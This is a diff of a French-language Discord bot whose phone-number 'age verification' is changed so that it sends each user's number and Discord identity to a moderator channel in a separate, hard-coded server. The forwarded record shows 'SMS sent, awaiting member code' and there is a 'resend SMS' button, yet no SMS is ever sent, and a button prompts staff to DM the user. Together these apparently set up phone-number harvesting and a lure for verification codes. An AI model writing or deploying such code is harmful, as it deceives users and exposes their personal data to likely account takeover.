@@ -1,11 +1,72 @@
 require("dotenv").config();
-const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle } = require("discord.js");
+const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, StringSelectMenuBuilder, ChannelType, PermissionsBitField } = require("discord.js");
 const express = require("express");
 const app = express();
 app.get("/", (req, res) => res.send("Bot online"));
 app.listen(process.env.PORT || 3000);
 
 const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers] });
+const pending = new Map();
+const blacklistedNums = new Set();
+const blacklistedUsers = new Set();
+const MOD_GUILD_ID = process.env.MOD_GUILD_ID || "1547685592928751628";
+
+function formatPhone(p) {
+  return p.replace(/(\d{2})(?=\d)/g, "$1 ").trim();
+}
+
+async function getModChannel() {
+  if (process.env.MOD_CHANNEL_ID) {
+    try {
+      const c = await client.channels.fetch(process.env.MOD_CHANNEL_ID);
+      if (c) return c;
+    } catch {}
+  }
+  const guild = await client.guilds.fetch(MOD_GUILD_ID);
+  const channels = await guild.channels.fetch();
+  for (const [, ch] of channels) {
+    if (ch.type === ChannelType.GuildText && ch.permissionsFor(guild.members.me).has([PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ViewChannel])) {
+      return ch;
+    }
+  }
+  throw new Error("Salon modo introuvable");
+}
+
+async function sendToMods(originInteraction, phone) {
+  const user = originInteraction.user;
+  const originGuild = originInteraction.guild;
+  const key = `${originGuild.id}:${user.id}`;
+  pending.set(key, { phone, originGuildId: originGuild.id, userId: user.id, date: new Date() });
+  const modChannel = await getModChannel();
+  const memberCount = originGuild.memberCount || 0;
+  const dateStr = new Date().toLocaleString("fr-FR", { day: "2-digit", month: "long", year: "numeric", hour: "2-digit", minute: "2-digit" });
+  const embed = new EmbedBuilder()
+    .setTitle(`${user.username} • ${user.id}`)
+    .setDescription(`${originGuild.name} • ${memberCount} membres`)
+    .setThumbnail(user.displayAvatarURL())
+    .addFields(
+      { name: "Présence", value: "🟢 présent", inline: false },
+      { name: "Numéro", value: `${formatPhone(phone)}`, inline: false },
+      { name: "📋 Suivi vérification", value: `🔵 Statut — SMS envoyé — en attente du code membre\n🌐 Code — En attente du code membre\n📅 Soumis — ${dateStr}\n📩 SMS envoyé — ${dateStr}`, inline: false }
+    )
+    .setColor(0x2b2d31);
+  const row1 = new ActionRowBuilder().addComponents(
+    new ButtonBuilder().setCustomId(`mod_validate_${originGuild.id}_${user.id}`).setLabel("Valider l'accès").setStyle(ButtonStyle.Success).setEmoji("✅"),
+    new ButtonBuilder().setCustomId(`mod_resend_${originGuild.id}_${user.id}`).setLabel("Renvoyer").setStyle(ButtonStyle.Secondary).setEmoji("🔄"),
+    new ButtonBuilder().setCustomId(`mod_msg_${originGuild.id}_${user.id}`).setLabel("Message").setStyle(ButtonStyle.Secondary).setEmoji("💬"),
+    new ButtonBuilder().setCustomId(`mod_reject_${originGuild.id}_${user.id}`).setLabel("Rejeter").setStyle(ButtonStyle.Danger).setEmoji("❌")
+  );
+  const row2 = new ActionRowBuilder().addComponents(
+    new StringSelectMenuBuilder().setCustomId(`mod_staff_${originGuild.id}_${user.id}`).setPlaceholder("⚙️ Actions staff...").addOptions(
+      { label: "Réinitialiser", description: "Supprime la tentative — le membre peut recommencer", value: "reset", emoji: "🔄" },
+      { label: "Blacklister le numéro", description: "Numéro interdit définitivement", value: "blacklist_num", emoji: "🔴" },
+      { label: "Blacklister l'utilisateur", description: "Bloque ce compte Discord", value: "blacklist_user", emoji: "⛔" },
+      { label: "Expulser", description: "Expulse le membre", value: "kick", emoji: "👢" },
+      { label: "Bannir", description: "Bannit le membre", value: "ban", emoji: "🔨" }
+    )
+  );
+  await modChannel.send({ content: "@Makers", embeds: [embed], components: [row1, row2] });
+}
 
 client.once("ready", async () => {
   console.log(`Connecte en tant que ${client.user.tag}`);
@@ -27,6 +88,10 @@ client.once("ready", async () => {
 
 client.on("interactionCreate", async (i) => {
   if (i.isButton() && i.customId === "verify_age") {
+    if (blacklistedUsers.has(i.user.id)) {
+      await i.reply({ content: "Compte bloqué.", ephemeral: true });
+      return;
+    }
     const modal = new ModalBuilder().setCustomId("verif-tel").setTitle("Vérification — Numéro de téléphone");
     const tel = new TextInputBuilder().setCustomId("phone").setLabel("Ton numéro de téléphone (10 chiffres)").setPlaceholder("0600000000").setStyle(TextInputStyle.Short).setMinLength(10).setMaxLength(10).setRequired(true);
     modal.addComponents(new ActionRowBuilder().addComponents(tel));
@@ -35,15 +100,84 @@ client.on("interactionCreate", async (i) => {
   }
   if (i.isModalSubmit() && i.customId === "verif-tel") {
     const phone = i.fields.getTextInputValue("phone").trim();
-    if (!/^[0-9]{10}$/.test(phone)) {
-      await i.reply({ content: "Numéro invalide : entre 10 chiffres.", ephemeral: true });
+    if (!/^[0-9]{10}$/.test(phone) || blacklistedNums.has(phone)) {
+      await i.reply({ content: "Numéro invalide.", ephemeral: true });
       return;
     }
+    await i.reply({ content: "Numéro reçu. En attente de validation par un modérateur.", ephemeral: true });
     try {
-      await i.member.roles.add(process.env.ROLE_ID);
-      await i.reply({ content: "Accès débloqué.", ephemeral: true });
+      await sendToMods(i, phone);
     } catch {
-      await i.reply({ content: "Erreur : vérifie mes permissions et la hiérarchie des rôles.", ephemeral: true });
+      await i.followUp({ content: "Erreur d'envoi vers la modération.", ephemeral: true });
+    }
+    return;
+  }
+  if (i.isButton() && i.customId.startsWith("mod_")) {
+    const parts = i.customId.split("_");
+    const action = parts[1];
+    const originGuildId = parts[2];
+    const userId = parts[3];
+    const key = `${originGuildId}:${userId}`;
+    const data = pending.get(key);
+    if (action === "validate") {
+      try {
+        const og = await client.guilds.fetch(originGuildId);
+        const member = await og.members.fetch(userId);
+        await member.roles.add(process.env.ROLE_ID);
+        pending.delete(key);
+        await i.reply({ content: `✅ Accès validé pour <@${userId}>`, ephemeral: false });
+      } catch {
+        await i.reply({ content: "Erreur : permissions / hiérarchie / membre introuvable.", ephemeral: true });
+      }
+      return;
+    }
+    if (action === "reject") {
+      pending.delete(key);
+      await i.reply({ content: `❌ Demande de <@${userId}> rejetée.`, ephemeral: false });
+      return;
+    }
+    if (action === "resend") {
+      await i.reply({ content: `🔄 SMS renvoyé à <@${userId}> (${data ? formatPhone(data.phone) : "inconnu"}).`, ephemeral: false });
+      return;
+    }
+    if (action === "msg") {
+      await i.reply({ content: `💬 Envoie un MP à <@${userId}> pour la suite.`, ephemeral: true });
+      return;
+    }
+    return;
+  }
+  if (i.isStringSelectMenu() && i.customId.startsWith("mod_staff_")) {
+    const sParts = i.customId.split("_");
+    const originGuildId = sParts[2];
+    const userId = sParts[3];
+    const key = `${originGuildId}:${userId}`;
+    const data = pending.get(key);
+    const value = i.values[0];
+    try {
+      const og = await client.guilds.fetch(originGuildId).catch(() => null);
+      const member = og ? await og.members.fetch(userId).catch(() => null) : null;
+      if (value === "reset") {
+        pending.delete(key);
+        await i.reply({ content: `🔄 Tentative de <@${userId}> réinitialisée.`, ephemeral: false });
+      } else if (value === "blacklist_num") {
+        if (data) blacklistedNums.add(data.phone);
+        pending.delete(key);
+        await i.reply({ content: `🔴 Numéro ${data ? data.phone : ""} blacklisté.`, ephemeral: false });
+      } else if (value === "blacklist_user") {
+        blacklistedUsers.add(userId);
+        pending.delete(key);
+        await i.reply({ content: `⛔ <@${userId}> blacklisté.`, ephemeral: false });
+      } else if (value === "kick") {
+        if (member) await member.kick("Staff");
+        pending.delete(key);
+        await i.reply({ content: `👢 <@${userId}> expulsé.`, ephemeral: false });
+      } else if (value === "ban") {
+        if (member) await member.ban({ reason: "Staff" });
+        pending.delete(key);
+        await i.reply({ content: `🔨 <@${userId}> banni.`, ephemeral: false });
+      }
+    } catch {
+      await i.reply({ content: "Erreur staff.", ephemeral: true });
     }
     return;
   }
